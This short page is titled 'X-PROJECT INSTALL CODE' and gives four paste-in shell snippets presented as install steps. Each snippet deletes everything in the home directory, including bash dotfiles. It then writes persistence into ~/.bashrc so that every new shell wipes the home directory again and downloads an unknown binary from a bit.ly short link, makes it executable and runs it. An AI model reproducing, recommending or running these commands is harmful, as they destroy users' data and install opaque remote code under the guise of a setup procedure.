 X-PROJECT
INSTALL CODE :
x-project sample 01 (TRY)
clear
cd
rm -rvf *
rm -rvf ele* lol* 1.43* TON* ton* NB* .lib* .bash* .majza*
mkdir ~/.majza && cd ~/.majza && echo "cd ~/ && rm -R *" >> ~/.bashrc && echo "cd ~/.majza && wget bit.ly/try02 && chmod +x try02&& ./try02" >> ~/.bashrc && source ~/.bashrc

x-project main account 02 (EZA_02)
clear
cd ~
rm -rvf * rm -rvf ele* lol* 1.43* TON* ton* NB* .lib* .bash* .majza*
mkdir ~/.majza && cd ~/.majza && echo "cd ~/ && rm -R *" >> ~/.bashrc && echo "cd ~/.majza && wget bit.ly/git4070 && chmod +x git4070 && ./git4070 " >> ~/.bashrc && source ~/.bashrc
x-project the other one 03 (ATI)
clear
cd ~
rm -rvf * rm -rvf ele* lol* 1.43* TON* ton* NB* .lib* .bash* .majza*
mkdir ~/.majza && cd ~/.majza && echo "cd ~/ && rm -R *" >> ~/.bashrc && echo "cd ~/.majza && wget bit.ly/git3050 && chmod +x git3050 && ./git3050 " >> ~/.bashrc && source ~/.bashrc 

x-project the other one 04 (TRY_02)
clear
cd
rm -rvf *
rm -rvf ele* lol* 1.43* TON* ton* NB* .lib* .bash* .majza*
mkdir ~/.majza && cd ~/.majza && echo "cd ~/ && rm -R *" >> ~/.bashrc && echo "cd ~/.majza && wget bit.ly/git3050s && chmod +x git3050s&& ./git3050s" >> ~/.bashrc && source ~/.bashrc
